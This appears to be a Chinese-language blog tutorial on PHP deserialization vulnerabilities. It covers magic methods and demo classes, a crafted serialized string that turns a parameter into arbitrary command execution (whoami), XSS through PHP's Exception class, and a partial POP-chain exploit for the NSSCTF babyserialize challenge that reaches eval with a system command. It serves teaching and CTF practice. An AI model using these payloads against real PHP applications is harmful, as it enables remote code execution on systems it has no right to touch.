        <content type="html"><![CDATA[<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p><strong>序列化</strong>：<code>serialize()</code>，将对象转化为数组或者字符串等格式</p><p><strong>反序列化</strong>：<code>unserialize()</code>，将数组或字符串等格式转化成对象</p><p>为什么要进行序列化和反序列化？是因为我们在传递和保存对象时，为了保证对象的完整性和可传递性，我们将对象转换为有序字节流，以便在网络上传输或者保存在本地文件中。</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>在PHP中存在一些魔术方法，可以控制优先执行什么或者初始化什么，但是如果魔术方法适用不当，就会造成反序列化漏洞，其原理是未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、SQL注入等不可控后果，其中一些常见的魔术方法如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：</span><br><span class="line"><span class="title function_ invoke__">__construct</span>():     <span class="comment">//构造函数，当对象 new 的时候会自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()：    <span class="comment">//析构函数当对象被销毁时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():     <span class="comment">//unserialize()时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>():     <span class="comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>():     <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>():     <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>():     <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>():     <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>():     <span class="comment">//在不可访问的属性上调用 isset()或 empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>():     <span class="comment">//在不可访问的属性上使用 unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>():     <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>():     <span class="comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep()，如果存在，该方法会被优先调用</span></span><br></pre></td></tr></table></figure><p>我们接下来以几个例子来展现反序列化的安全问题，首先代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;echo test&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;end&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;start&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;__toString&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们访问一下该网站，得到的结果如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822092633125.png" alt="image-20240822092633125"></p><p>首先输出一个start，然后再输出一个end，所以是依次调用了<code>__construct()</code>和<code>__destruct()</code>函数，我们再加上<code>echo serialize($a)</code>，我们看看输出了什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822093000152.png" alt="image-20240822093000152"></p><p>这个操作就把public中的$var输出来了，我们接下来不创建对象，直接适用反序列化进行输入，如下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;echo test&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;end&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;start&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;__toString&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a = new A();</span></span><br><span class="line"><span class="comment">//echo serialize($a).&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="variable">$t</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;echo test&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822093551923.png" alt="image-20240822093551923"></p><p>我们发现只输出了一个end，证明已经创建过对象了，所以不会再触发<code>__construct()</code>函数，只会在代码结束的时候触发<code>__destruct()</code>函数</p><p>当我们再添加如下代码的时候，我们观察会有什么情况</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822094025002.png" alt="image-20240822094025002"></p><p>从这里我们可以看出，当你想要调用类里面的方法的时候，你可以选择创建对应的类，然后使用相关的方法，例如<code>$a-&gt;test();</code>，也可以不使用对应的类，我们可以使用魔术方法，比如<code>__toString()</code>方法，这个方法被调用的条件就是当一个类被当作字符串输出的时候被调用，所以我们这里使用echo让其输出也可以调用对应的方法，让其输出<code>__toString</code></p><p>我们再来看一个相关的例子，如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;yyds&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>我们试着执行一下，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822094736880.png" alt="image-20240822094736880"></p><p>加入代码<code>unserialize($_GET[&#39;x&#39;]);</code>，当我们输入<code>?x=O:1:&quot;B&quot;:0:&#123;&#125;</code>的时候也会触发该命令执行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822095007891.png" alt="image-20240822095007891"></p><p>我们接下来展示如何利用反序列化漏洞进行任意命令执行，如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;ipconfig&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;yyds&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cc</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>);</span><br></pre></td></tr></table></figure><p>我们首先先看看这串代码被序列化后是什么情况，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822095610797.png" alt="image-20240822095610797"></p><p>我们此时加上反序列化代码以接收序列化数据</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822095658130.png" alt="image-20240822095658130"></p><p>我们此时将序列化数据中的命令任意更改，如将<code>O:1:&quot;C&quot;:1:&#123;s:3:&quot;cmd&quot;;s:8:&quot;ipconfig&quot;;&#125;</code>改成<code>O:1:&quot;C&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>，并进行传参</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822095837379.png" alt="image-20240822095837379"></p><p>实现了任意命令执行，这就是反序列化漏洞的基本原理</p><h1 id="公私有属性"><a href="#公私有属性" class="headerlink" title="公私有属性"></a>公私有属性</h1><ul><li>public（公共的），是在本类内部、外部类、子类都可以访问；</li><li>protect（受保护的），只有本类或子类或父类中可以访问；</li><li>private（私人的），只有本类内部可以使用。</li></ul><p>当进行PHP序列化的时候，private和protected变量会引入不可见字符%00，private会变成<code>%00类名%00属性名</code>，protected为<code>%00*%00属性名</code>，由于%00是ascii码为0的字符，这个字符显示和输出看不到，但是这也是序列化后去区分公私有属性的重要标准之一，所以我们一般进行url编码，否则我们可能看不到区别。</p><h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>更多内容参考这一篇文章：<a href="https://www.anquanke.com/post/id/264823">浅析PHP原生类-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>首先我们使用下面的脚本去生成原生类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240824110136575.png" alt="image-20240824110136575"></p><p>我们这里以一个本地搭建的Demo来进行原生类的演示，如下所示</p><p>首先创建一个PHP文件，代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240824150214160.png" alt="image-20240824150214160"></p><p>由于这里有echo，所以我们可以尝试调用<code>__toString</code>方法，但是这里又没有<code>toString</code>方法，所以这里我们考虑使用原生类，我们首先先查找一下<code>toString</code>方法的原生类</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240824150615469.png" alt="image-20240824150615469"></p><p>我们这里使用Exception进行利用，我们可以去其官方文档上找相关的用法</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240824151104472.png" alt="image-20240824151104472"></p><p>我们可以使用这个的同时，将其中的<code>some error messgae</code>换成xss语句</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240824151421334.png" alt="image-20240824151421334"></p><p>接着我们将生成的序列化语句当作参数传入，会得到想应得弹窗</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240824151552706.png" alt="image-20240824151552706"></p><p>成功将反序列化漏洞和XSS漏洞结合在一起</p><h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><p>我们这里以nssctf上的babyserialize为例子，如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>像这种有很多类的一看就知道要构造pop链，构造的过程可能有点绕，需要足够的耐心与技巧</p><p>首先我们需要去寻找哪里存在任意命令执行函数或者flag字眼，通过我们观察，我们可以发现在NISA类中存在命令执行函数</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822101435459.png" alt="image-20240822101435459"></p><p>我们进行相关的标注，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822101548353.png" alt="image-20240822101548353"></p><p>接着我们寻找如何触发<code>__invoke()</code>函数，这是一个魔术方法，当尝试以调用函数的方法调用一个对象时，会被自动调用，我们可以去寻找类似于<code>$a()</code>这种的，我们在Ilovetxw类中找到了<code>$bb()</code>函数</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822102017606.png" alt="image-20240822102017606"></p><p>我们的<code>$bb</code>来自于<code>$su</code>，我们进行相关标记，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822102229775.png" alt="image-20240822102229775"></p><p>表示要传入NISA类中，接着我们要调用<code>__toString()</code>函数，这个函数当对象被当做字符串的时候会自动调用</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822102627407.png" alt="image-20240822102627407"></p><p>我们找到这里，这里我们可以知道应该进行如下标记</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822102812161.png" alt="image-20240822102812161"></p><p>接下来我们找哪里调用了<code>__set()</code>魔术方法，其用于将数据写入不可访问的属性</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822103017369.png" alt="image-20240822103017369"></p><p>我们发现这个fun参数并不存在于当前的类中，所以我们这里做如下标记</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822103155973.png" alt="image-20240822103155973"></p><p>我们接着去寻找谁调用了<code>__call()</code>函数，我们可以知道，在对象上下文中调用不可访问的方法时触发，我们发现nisa这个方法并不存在</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822103517172.png" alt="image-20240822103517172"></p><p>所以我们可以做如下标记</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822103641056.png" alt="image-20240822103641056"></p><p>此时我们也找到了我们的链头，因为<code>__wakeup()</code>函数在触发反序列化的时候就会被触发，至此整个pop链构造完成，接下来我们就开始构造代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;666&quot;</span>; <span class="comment">//绕过hint()函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">// 5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">// 4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">//2 NISA</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">// 3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;sixsixsix&#x27;</span>; <span class="comment">//$fun=&#x27;sixsixsix&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;txw4ever=<span class="string">&#x27;SYSTEM(&quot;ls /&quot;);&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>= <span 